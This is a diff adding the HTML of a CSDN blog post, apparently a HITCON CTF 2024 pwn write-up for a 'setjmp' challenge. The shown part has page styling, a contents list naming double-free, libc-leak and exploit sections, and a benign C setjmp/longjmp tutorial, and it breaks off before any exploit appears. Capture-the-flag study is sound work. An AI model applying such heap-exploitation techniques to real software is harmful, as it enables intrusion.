@@ -1,0 +1,4668 @@
+<div class="article-header-box">
+  <div class="article-header">
+    <div class="article-title-box">
+      <h1 class="title-article" id="articleContentId">
+        HITCON-CTF-2024-Quals-setjmp
+      </h1>
+    </div>
+    <div class="article-info-box">
+      <div class="article-bar-top">
+        <img
+          class="article-type-img"
+          src="https://csdnimg.cn/release/blogv2/dist/pc/img/original.png"
+          alt=""
+        />
+        <div class="bar-content">
+          <a
+            class="follow-nickName vip-name"
+            href="https://blog.csdn.net/llovewuzhengzi"
+            target="_blank"
+            rel="noopener"
+            title="看星猩的柴狗"
+            >看星猩的柴狗</a
+          >
+          <img
+            class="article-time-img article-heard-img"
+            src="https://csdnimg.cn/release/blogv2/dist/pc/img/newUpTime2.png"
+            alt=""
+          />
+          <span class="time">已于&nbsp;2024-07-16 11:47:59&nbsp;修改</span>
+          <div class="read-count-box">
+            <img
+              class="article-read-img article-heard-img"
+              src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png"
+              alt=""
+            />
+            <span class="read-count">阅读量947</span>
+            <a
+              id="blog_detail_zk_collection"
+              class="un-collection"
+              data-report-click='{"mod":"popu_823","spm":"1001.2101.3001.4232","ab":"new"}'
+            >
+              <img
+                class="article-collect-img article-heard-img un-collect-status isdefault"
+                style="display: inline-block"
+                src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png"
+                alt=""
+              />
+              <img
+                class="article-collect-img article-heard-img collect-status isactive"
+                style="display: none"
+                src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive2.png"
+                alt=""
+              />
+              <span class="name">收藏</span>
+              <span class="get-collection"> 18 </span>
+            </a>
+            <div class="read-count-box is-like">
+              <img
+                class="article-read-img article-heard-img"
+                style="display: none"
+                id="is-like-imgactive-new"
+                src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Active.png"
+                alt=""
+              />
+              <img
+                class="article-read-img article-heard-img"
+                style="display: block"
+                id="is-like-img-new"
+                src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Black.png"
+                alt=""
+              />
+              <span class="read-count" id="blog-digg-num">点赞数 23 </span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="blog-tags-box">
+        <div class="tags-box artic-tag-box">
+          <span class="label">分类专栏：</span>
+          <a
+            class="tag-link"
+            href="https://blog.csdn.net/llovewuzhengzi/category_12731099.html"
+            target="_blank"
+            rel="noopener"
+            >HITCON CTF</a
+          >
+          <span class="label">文章标签：</span>
+          <a
+            rel="nofollow"
+            data-report-click='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"hitcon","ab":"new","extra":"{\"searchword\":\"hitcon\"}"}'
+            class="tag-link"
+            href="https://so.csdn.net/so/search/s.do?q=hitcon&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle="
+            target="_blank"
+            >hitcon</a
+          >
+        </div>
+      </div>
+      <div class="up-time">
+        <span>于&nbsp;2024-07-16 11:46:18&nbsp;首次发布</span>
+      </div>
+      <div class="slide-content-box">
+        <div class="article-copyright">
+          <div class="creativecommons">
+            版权声明：本文为博主原创文章，遵循<a
+              href="http://creativecommons.org/licenses/by-sa/4.0/"
+              target="_blank"
+              rel="noopener"
+            >
+              CC 4.0 BY-SA </a
+            >版权协议，转载请附上原文出处链接和本声明。
+          </div>
+          <div class="article-source-link">
+            本文链接：<a
+              href="https://blog.csdn.net/llovewuzhengzi/article/details/140413292"
+              target="_blank"
+              >https://blog.csdn.net/llovewuzhengzi/article/details/140413292</a
+            >
+          </div>
+        </div>
+      </div>
+
+      <div class="operating">
+        <a class="href-article-edit slide-toggle">版权</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="blogColumnPayAdvert">
+  <div class="column-group">
+    <div class="column-group-item column-group0 column-group-item-one">
+      <div class="item-l">
+        <a
+          class="item-target"
+          href="https://blog.csdn.net/llovewuzhengzi/category_12731099.html"
+          target="_blank"
+          title="HITCON CTF"
+          data-report-click='{"spm":"1001.2101.3001.6332"}'
+        >
+          <img
+            class="item-target"
+            src="https://img-blog.csdnimg.cn/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64"
+            alt=""
+          />
+          <span class="title item-target">
+            <span>
+              <span class="tit">HITCON CTF</span>
+              <span class="dec">专栏收录该内容</span>
+            </span>
+          </span>
+        </a>
+      </div>
+      <div class="item-m">
+        <span>1 篇文章</span>
+        <span>0 订阅</span>
+      </div>
+      <div class="item-r">
+        <a
+          class="item-target article-column-bt articleColumnFreeBt"
+          data-id="12731099"
+          >订阅专栏</a
+        >
+      </div>
+    </div>
+  </div>
+</div>
+<article class="baidu_pl">
+  <div id="article_content" class="article_content clearfix">
+    <link
+      rel="stylesheet"
+      href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css"
+    /><style class="darkreader darkreader--cors" media="screen">
+      .htmledit_views .kdocs-img,
+      .kdocs-document {
+        max-width: 100%;
+        overflow: hidden;
+      }
+      .kdocs-document p {
+        line-height: unset !important;
+      }
+      .kdocs-checked-list [type="checkbox"],
+      .kdocs-unchecked-list [type="checkbox"] {
+        margin-right: 8px;
+      }
+      .kdocs-line-container {
+        margin-bottom: 16px;
+      }
+      .htmledit_views .kdocs-img {
+        width: 100%;
+      }
+      .htmledit_views .kdocs-img img {
+        max-height: unset !important;
+      }
+      .htmledit_views table.kdocs-table {
+        width: max-content;
+        max-width: unset;
+      }
+      .htmledit_views .kdocs-fontSize img.kdocs-latex-img {
+        vertical-align: middle;
+      }
+      .htmledit_views .kdocs-document ol,
+      .htmledit_views .kdocs-document ul {
+        margin: 0 0 8px;
+      }
+      .htmledit_views .kdocs-document ol > li,
+      .htmledit_views .kdocs-document ol > li > p,
+      .htmledit_views .kdocs-document ul > li,
+      .htmledit_views .kdocs-document ul > li > p {
+        margin: 0;
+      }
+      .htmledit_views .kdocs-document ol + :not(ol),
+      .htmledit_views .kdocs-document ul + :not(ul) {
+        padding-top: 16px;
+      }
+      .htmledit_views .kdocs-document p.kdocs-checked-list,
+      .htmledit_views .kdocs-document p.kdocs-unchecked-list {
+        margin: 0 0 8px !important;
+      }
+      .htmledit_views
+        .kdocs-document
+        p.kdocs-checked-list
+        + :not(p.kdocs-checked-list):not(p.kdocs-unchecked-list),
+      .htmledit_views
+        .kdocs-document
+        p.kdocs-unchecked-list
+        + :not(p.kdocs-checked-list):not(p.kdocs-unchecked-list) {
+        padding-top: 24px;
+      }
+      .htmledit_views input[type="checkbox"]:checked {
+        position: relative;
+      }
+      .htmledit_views input[type="checkbox"]:checked::after {
+        content: "";
+        position: absolute;
+        left: 2px;
+        top: 1px;
+        height: 6px;
+        width: 10px;
+        border-left: 1px solid #fff;
+        border-bottom: 1px solid #fff;
+        transform: rotate(-45deg);
+      }
+      .htmledit_views input[type="checkbox"]:checked::before {
+        content: "";
+        position: absolute;
+        width: 13px;
+        height: 13px;
+        background: #1989fa;
+        border-radius: 2px;
+      }</style
+    ><style class="darkreader darkreader--sync" media="screen"></style>
+    <link
+      rel="stylesheet"
+      href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-044f2cf1dc.css"
+    /><style class="darkreader darkreader--cors" media="screen">
+      .htmledit_views address,
+      .htmledit_views cite,
+      .htmledit_views dfn,
+      .htmledit_views em,
+      .htmledit_views i,
+      .htmledit_views span[lang],
+      .htmledit_views var {
+        font-style: italic;
+      }
+      .htmledit_views {
+        font-family:
+          -apple-system,
+          SF UI Text,
+          Arial,
+          PingFang SC,
+          Hiragino Sans GB,
+          Microsoft YaHei,
+          WenQuanYi Micro Hei,
+          sans-serif,
+          SimHei,
+          SimSun;
+      }
+      .cke_editable {
+        margin: 24px;
+        word-wrap: break-word;
+      }
+      .htmledit_views figure.right,
+      .htmledit_views img.right {
+        float: right;
+        margin-left: 15px;
+        padding: 5px;
+      }
+      .htmledit_views figure.left,
+      .htmledit_views img.left {
+        float: left;
+        margin-right: 15px;
+        padding: 5px;
+      }
+      .htmledit_views .marker {
+        background-color: #ff0;
+      }
+      .htmledit_views figure {
+        text-align: center;
+        margin: 0 24px;
+        display: inline-block;
+      }
+      .htmledit_views figure > figcaption {
+        text-align: center;
+        margin: 8px;
+        color: #999;
+        font-size: 14px;
+        display: block;
+      }
+      .htmledit_views a > img {
+        padding: 1px;
+        margin: 1px;
+        border: none;
+        outline: #0782c1 solid 1px;
+      }
+      .htmledit_views .code-featured {
+        border: 5px solid red;
+      }
+      .htmledit_views .math-featured {
+        padding: 20px;
+        box-shadow: 0 0 2px rgba(200, 0, 0, 1);
+        background-color: rgba(255, 0, 0, 0.05);
+        margin: 10px;
+      }
+      .htmledit_views .image-clean {
+        border: 0;
+        background: 0 0;
+        padding: 0;
+      }
+      .htmledit_views .image-clean > figcaption {
+        font-size: 0.9em;
+        text-align: right;
+      }
+      .htmledit_views .image-grayscale {
+        background-color: #fff;
+        color: #666;
+      }
+      .htmledit_views .image-grayscale img,
+      .htmledit_views img.image-grayscale {
+        filter: grayscale(100%);
+      }
+      .htmledit_views .embed-240p {
+        max-width: 426px;
+        max-height: 240px;
+        margin: 0 auto;
+      }
+      .htmledit_views .embed-360p {
+        max-width: 640px;
+        max-height: 360px;
+        margin: 0 auto;
+      }
+      .htmledit_views .embed-480p {
+        max-width: 854px;
+        max-height: 480px;
+        margin: 0 auto;
+      }
+      .htmledit_views .embed-720p {
+        max-width: 1280px;
+        max-height: 720px;
+        margin: 0 auto;
+      }
+      .htmledit_views .embed-1080p {
+        max-width: 1920px;
+        max-height: 1080px;
+        margin: 0 auto;
+      }
+      .htmledit_views p {
+        font-size: 18px;
+        color: #4d4d4d;
+        font-weight: 400;
+        line-height: 24px !important;
+        margin: 0 0 16px;
+        overflow-x: auto;
+        overflow-y: hidden;
+      }
+      .htmledit_views .img-center,
+      p[align="center"] {
+        text-align: center;
+      }
+      .htmledit_views img {
+        max-width: 100%;
+        height: auto;
+      }
+      .htmledit_views strong,
+      .htmledit_views strong span {
+        font-weight: 700;
+      }
+      .htmledit_views * {
+        box-sizing: border-box;
+      }
+      .htmledit_views h1,
+      .htmledit_views h1 *,
+      .htmledit_views h2,
+      .htmledit_views h2 *,
+      .htmledit_views h3,
+      .htmledit_views h3 *,
+      .htmledit_views h4,
+      .htmledit_views h4 *,
+      .htmledit_views h5,
+      .htmledit_views h5 *,
+      .htmledit_views h6,
+      .htmledit_views h6 * {
+        color: #4f4f4f;
+        margin: 24px 0 8px;
+        font-weight: 600;
+      }
+      .htmledit_views ol,
+      .htmledit_views ul {
+        margin: 0 0 24px;
+        padding: 0;
+        font-size: 16px;
+      }
+      .htmledit_views ul ol {
+        margin: 0 0 24px 32px;
+      }
+      .htmledit_views ul li {
+        list-style-type: disc;
+        margin: 8px 0 0 32px;
+      }
+      .htmledit_views ol li {
+        list-style-type: decimal;
+        margin-left: 40px;
+        margin-top: 8px;
+      }
+      .htmledit_views h1 {
+        font-size: 24px;
+        line-height: 34px;
+      }
+      .htmledit_views h2 {
+        font-size: 22px;
+        line-height: 32px;
+      }
+      .htmledit_views h3 {
+        font-size: 20px;
+        line-height: 30px;
+      }
+      .htmledit_views h4 {
+        font-size: 18px;
+        line-height: 26px;
+      }
+      .htmledit_views h5 {
+        font-size: 16px;
+        line-height: 26px;
+      }
+      .htmledit_views h6 {
+        font-size: 16px;
+        line-height: 24px;
+      }
+      .htmledit_views blockquote {
+        display: block;
+        padding: 16px;
+        margin: 0 0 24px;
+        border-left: 8px solid #dddfe4;
+        background: #eef0f4;
+        overflow: auto;
+        overflow-scrolling: touch;
+        word-wrap: normal;
+        word-break: normal;
+      }
+      .htmledit_views blockquote ol,
+      .htmledit_views blockquote ul {
+        margin-bottom: 16px;
+        padding: 0;
+        font-size: 16px;
+        line-height: 24px;
+      }
+      .htmledit_views blockquote ol li,
+      .htmledit_views blockquote ul li {
+        margin-bottom: 0;
+      }
+      .htmledit_views blockquote p {
+        font-size: 16px;
+        line-height: 26px;
+        font-weight: 400;
+        margin-bottom: 0;
+        color: #4f4f4f;
+      }
+      .htmledit_views hr {
+        margin: 24px 0;
+        border: none;
+        border-bottom: solid #ccc 1px;
+      }
+      .htmledit_views table tr {
+        border: 0;
+        border-top: 1px solid #ddd;
+        background-color: #fff;
+      }
+      .htmledit_views table {
+        border-collapse: collapse;
+        display: table;
+        width: 100%;
+        text-align: left;
+        margin-bottom: 24px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .htmledit_views tbody {
+        border: 0;
+      }
+      .htmledit_views table tr:nth-child(2n) {
+        background-color: #f7f7f7;
+      }
+      .htmledit_views table tr td,
+      .htmledit_views table tr th {
+        border: 1px solid #ddd;
+        font-size: 14px;
+        color: #4f4f4f;
+        line-height: 22px;
+        padding: 8px;
+        text-align: left;
+      }
+      .htmledit_views table tr td p,
+      .htmledit_views table tr th p {
+        font-size: 14px;
+        color: #4f4f4f;
+        margin: 0;
+        padding: 0;
+        text-align: left;
+        line-height: 22px;
+      }
+      .htmledit_views table tr th p {
+        font-weight: 700;
+      }
+      .htmledit_views table tr td code,
+      .htmledit_views table tr th code {
+        white-space: normal;
+        word-break: break-word;
+      }
+      .htmledit_views table tr th {
+        font-weight: 700;
+        background-color: #eff3f5;
+      }
+      .htmledit_views dl {
+        margin: 24px;
+      }
+      .htmledit_views dl dt {
+        margin: 8px;
+        font-weight: 700;
+      }
+      .htmledit_views dl dt dd {
+        margin: 8px;
+      }
+      .htmledit_views abbr[data-original-title],
+      .htmledit_views abbr[title] {
+        cursor: help;
+        border-bottom: 1px dotted #999;
+      }
+      .htmledit_views .initialism {
+        font-size: 90%;
+        text-transform: uppercase;
+      }
+      .htmledit_views pre {
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        margin: 0 0 24px;
+        overflow-x: auto;
+        padding: 8px;
+      }
+      .marker {
+        background-color: #ff0;
+      }
+      htmledit_views img.mathcode {
+        margin: 0 8px;
+      }
+      .htmledit_views kbd,
+      .htmledit_views pre,
+      .htmledit_views samp {
+        font-family: Consolas, Inconsolata, Courier, monospace;
+        font-size: 14px;
+        line-height: 22px;
+        color: #000;
+      }
+      .htmledit_views code ol li div.hljs-ln-code,
+      .htmledit_views code ol li div.hljs-ln-numbers,
+      .htmledit_views pre code,
+      .htmledit_views pre code div,
+      .htmledit_views pre code span {
+        font-family: "Source Code Pro", "DejaVu Sans Mono", "Ubuntu Mono",
+          "Anonymous Pro", "Droid Sans Mono", Menlo, Monaco, Consolas,
+          Inconsolata, Courier, monospace, "PingFang SC", "Microsoft YaHei",
+          sans-serif;
+      }
+      .htmledit_views code {
+        border-radius: 4px;
+      }
+      .htmledit_views a {
+        color: #4ea1db;
+        text-decoration: none;
+      }
+      .htmledit_views a:focus,
+      .htmledit_views a:hover {
+        color: #ca0c16;
+      }
+      .htmledit_views a:visited {
+        color: #6795b5;
+      }
+      .htmledit_views .hot-keyword:visited {
+        color: #3399ea;
+      }
+      .htmledit_views .footnote {
+        vertical-align: top;
+        position: relative;
+        top: -4px;
+        font-size: 12px;
+      }
+      .htmledit_views .flow-chart,
+      .htmledit_views .sequence-diagram {
+        text-align: center;
+        margin-bottom: 24px;
+        font-size: 14px !important;
+      }
+      .htmledit_views .flow-chart [fill="#000"],
+      .htmledit_views .flow-chart [fill="#000000"],
+      .htmledit_views .flow-chart [fill="black"],
+      .htmledit_views .sequence-diagram [fill="#000"],
+      .htmledit_views .sequence-diagram [fill="#000000"],
+      .htmledit_views .sequence-diagram [fill="black"] {
+        fill: #4f4f4f;
+      }
+      .htmledit_views .flow-chart [stroke="#000000"],
+      .htmledit_views .sequence-diagram [stroke="#000000"] {
+        stroke: #4f4f4f;
+      }
+      .htmledit_views .MathJax_SVG_Display {
+        text-align: center;
+        margin: 24px 0;
+        font-size: 18px;
+        font-weight: 400;
+        color: #4f4f4f;
+        position: relative;
+        text-indent: 0;
+        max-width: none;
+        max-height: none;
+        min-width: 0;
+        min-height: 0;
+        width: 100%;
+      }
+      .htmledit_views pre code {
+        display: block;
+        line-height: 22px;
+        overflow-x: auto;
+        white-space: pre;
+        word-wrap: normal;
+        border-radius: 4px;
+        padding: 8px;
+        tab-size: 4;
+      }
+      .htmledit_views pre code::-webkit-scrollbar {
+        height: 6px;
+        width: 138px;
+      }
+      .htmledit_views pre code::-webkit-scrollbar-thumb {
+        background: #c2c2c2;
+        border-radius: 4px;
+      }
+      .htmledit_views pre code code.hljs {
+        padding: 0;
+      }
+      .htmledit_views pre code:not(.hljs) {
+        background-color: #f3f4f5;
+      }
+      .htmledit_views pre code,
+      .htmledit_views pre code div,
+      .htmledit_views pre code span {
+        font-size: 14px;
+      }
+      .htmledit_views .prettyprint,
+      .htmledit_views pre.prettyprint {
+        margin: 0 0 24px;
+        padding: 8px 16px 4px 56px;
+        background-color: #f6f8fa;
+        border: none;
+      }
+      .htmledit_views .prettyprint .pre-numbering {
+        position: absolute;
+        width: 48px;
+        background-color: #eef0f4;
+        top: 0;
+        left: 0;
+        margin: 0;
+        padding: 8px 0;
+        list-style: none;
+        text-align: right;
+      }
+      .htmledit_views .pre-numbering li {
+        padding: 0 8px;
+        list-style: none;
+        margin: 0;
+      }
+      .htmledit_views dl dd {
+        margin: 0 0 8px 40px;
+      }
+      .htmledit_views kbd {
+        padding: 2px 8px;
+        border: 1px solid rgba(63, 63, 63, 0.25);
+        box-shadow: 0 1px 0 rgba(63, 63, 63, 0.25);
+        background-color: #fff;
+        color: #333;
+        border-radius: 4px;
+        display: inline-block;
+        margin: 0 2px;
+        white-space: nowrap;
+      }
+      .htmledit_views .dp-highlighter {
+        font-size: 12px;
+        text-align: left;
+        margin: 0 0 24px;
+      }
+      .htmledit_views code ol {
+        margin: 0;
+        overflow: hidden;
+      }
+      .htmledit_views code ol li {
+        list-style-type: none;
+        margin-left: 0;
+        margin-top: 0;
+        height: 22px;
+      }
+      .htmledit_views code ol li div.hljs-ln-code {
+        margin-left: 8px;
+      }
+      .htmledit_views code ol li div.hljs-ln-code,
+      .htmledit_views code ol li div.hljs-ln-numbers {
+        float: left;
+        height: 22px;
+      }
+      .htmledit_views code ol li div.hljs-ln-numbers {
+        width: 24px;
+        border-right: 1px solid #c5c5c5;
+      }
+      .htmledit_views code ol li div.hljs-ln-numbers .hljs-ln-line {
+        word-wrap: normal;
+      }
+      .htmledit_views code ol.hundred li div.hljs-ln-numbers {
+        width: 30px;
+      }
+      .htmledit_views code ol.thousand li div.hljs-ln-numbers {
+        width: 36px;
+      }
+      .htmledit_views .csdn-data-video {
+        width: 200px;
+      }
+      .htmledit_views .csdn-data-video img {
+        margin: 0;
+        display: block;
+        width: 200px;
+        height: 112px;
+      }
+      .htmledit_views .csdn-data-video p {
+        margin-top: 10px;
+        margin-bottom: 0;
+        font-size: 14px;
+      }
+      .htmledit_views pre[data-from="code-for-outside"] {
+        overflow: hidden;
+      }
+      .htmledit_views pre[data-from="code-for-outside"] code {
+        overflow-x: auto;
+        overflow-y: hidden;
+      }
+      .htmledit_views pre[data-from="code-for-outside"] code * {
+        overflow: visible;
+        overflow-wrap: break-word;
+      }
+      .htmledit_views pre[data-from="code-for-outside"] p code {
+        padding: 0;
+      }</style
+    ><style class="darkreader darkreader--sync" media="screen"></style>
+
+    <div id="content_views" class="markdown_views prism-atom-one-dark">
+      <svg xmlns="http://www.w3.org/2000/svg" style="display: none">
+        <path
+          stroke-linecap="round"
+          d="M5,0 0,2.5 5,5z"
+          id="raphael-marker-block"
+          style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0)"
+        ></path>
+      </svg>
+      <p></p>
+      <div class="toc">
+        <h4><a name="t0"></a>文章目录</h4>
+        <ul>
+          <li><a href="#_2" rel="nofollow" target="_self">检查</a></li>
+          <li>
+            <a href="#_setjmp__longjmp_4" rel="nofollow" target="_self"
+              >_setjmp 和 longjmp</a
+            >
+          </li>
+          <li>
+            <ul>
+              <li>
+                <ul>
+                  <li>
+                    <a href="#_setjmp__longjmp__7" rel="nofollow" target="_self"
+                      >_setjmp 和 longjmp 函数简介</a
+                    >
+                  </li>
+                  <li>
+                    <ul>
+                      <li>
+                        <a href="#_setjmp__11" rel="nofollow" target="_self"
+                          >_setjmp 函数</a
+                        >
+                      </li>
+                      <li>
+                        <a href="#longjmp__20" rel="nofollow" target="_self"
+                          >longjmp 函数</a
+                        >
+                      </li>
+                    </ul>
+                  </li>
+                  <li><a href="#_29" rel="nofollow" target="_self">示例</a></li>
+                </ul>
+              </li>
+              <li><a href="#_71" rel="nofollow" target="_self">实例</a></li>
+            </ul>
+          </li>
+          <li><a href="#_87" rel="nofollow" target="_self">逆向</a></li>
+          <li><a href="#_93" rel="nofollow" target="_self">相关参考</a></li>
+          <li><a href="#_97" rel="nofollow" target="_self">思路</a></li>
+          <li>
+            <a href="#double_freelibc_129" rel="nofollow" target="_self"
+              >double free-&gt;泄露libc</a
+            >
+          </li>
+          <li><a href="#exp_132" rel="nofollow" target="_self">exp</a></li>
+        </ul>
+      </div>
+      <p></p>
+      <h2><a name="t1"></a><a id="_2"></a>检查</h2>
+      <p>
+        <img
+          src="https://i-blog.csdnimg.cn/direct/ee11244d66dd46c88261b9c8d1909069.png"
+          alt="在这里插入图片描述"
+        />
+      </p>
+      <h2>
+        <a name="t2"></a><a id="_setjmp__longjmp_4"></a>_setjmp 和 longjmp
+      </h2>
+      <p>
+        <code>setjmp</code>和<code>longjmp</code>是C语言中用于实现<a
+          href="https://so.csdn.net/so/search?q=%E9%9D%9E%E5%B1%80%E9%83%A8&amp;spm=1001.2101.3001.7020"
+          target="_blank"
+          class="hl hl-1"
+          data-report-click='{"spm":"1001.2101.3001.7020","dest":"https://so.csdn.net/so/search?q=%E9%9D%9E%E5%B1%80%E9%83%A8&amp;spm=1001.2101.3001.7020","extra":"{\"searchword\":\"非局部\"}"}'
+          data-tit="非局部"
+          data-pretit="非局部"
+          >非局部</a
+        >跳转（non-local
+        jump）的函数，它们允许程序的控制流程跨越函数调用边界，从一个指定的位置跳转到另一个先前记录的位置。这与常规的函数调用和返回机制不同，常规机制只能在函数内部进行控制流的转移。
+      </p>
+      <h4>
+        <a name="t3"></a><a id="_setjmp__longjmp__7"></a>_setjmp 和 longjmp
+        函数简介
+      </h4>
+      <p>
+        <code>setjmp</code
+        >函数用于设置一个返回点，而<code>longjmp</code>函数则用于从程序的任何位置跳回到<code>setjmp</code>所设置的返回点。
+      </p>
+      <h5><a id="_setjmp__11"></a>_setjmp 函数</h5>
+      <p>
+        <code>_setjmp</code
+        >函数（在C++中通常称为<code>setjmp</code>）的原型如下：
+      </p>
+      <pre
+        data-index="0"
+        class="set-code-show prettyprint"
+      ><code class="prism language-c has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token keyword">int</span> <span class="token function">_setjmp</span><span class="token punctuation">(</span>jmp_buf env<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<div class="hljs-button signin active" data-title="登录复制" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.4334&quot;}"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">1</li></ul></pre>
+      <p>
+        <code>env</code
+        >是一个<code>jmp_buf</code>类型的数组，用于保存当前执行环境的信息，包括寄存器的值和程序计数器等。<code>_setjmp</code>函数返回0，如果这是第一次调用<code>_setjmp</code>；如果<code>longjmp</code>调用到了这个<code>env</code>，则<code>_setjmp</code>返回非零值。
+      </p>
+      <h5><a id="longjmp__20"></a>longjmp 函数</h5>
+      <p><code>longjmp</code>函数的原型如下：</p>
+      <pre
+        data-index="1"
+        class="set-code-show prettyprint"
+      ><code class="prism language-c has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token keyword">void</span> <span class="token function">longjmp</span><span class="token punctuation">(</span>jmp_buf env<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<div class="hljs-button signin active" data-title="登录复制" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.4334&quot;}"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">1</li></ul></pre>
+      <p>
+        <code>longjmp</code
+        >函数用于从当前的执行位置跳转回由<code>env</code>标识的<code>setjmp</code>点。<code>val</code>是传递给<code>setjmp</code>的返回值，通常用来指示跳转的原因。
+      </p>
+      <h4><a name="t4"></a><a id="_29"></a>示例</h4>
+      <p>下面是一个使用<code>_setjmp</code>和<code>longjmp</code>的例子：</p>
+      <pre
+        data-index="2"
+        class="set-code-hide prettyprint"
+      ><code class="prism language-c has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;setjmp.h&gt;</span></span>
+
+jmp_buf jmpbuf<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Inside my_function\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 模拟一个错误条件</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token function">longjmp</span><span class="token punctuation">(</span>jmpbuf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 发生错误，跳回到setjmp点</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Before setjmp\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">_setjmp</span><span class="token punctuation">(</span>jmpbuf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置返回点</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"First call to setjmp\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用可能抛出longjmp的函数</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Caught an error, ret=%d\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After possible longjmp\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<div class="hljs-button signin active" data-title="登录复制" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.4334&quot;}"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreWhite.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">1</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">2</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">3</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">4</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">5</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">6</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">7</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">8</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">9</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">10</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">11</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">12</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">13</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">14</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">15</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">16</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">17</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">18</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" 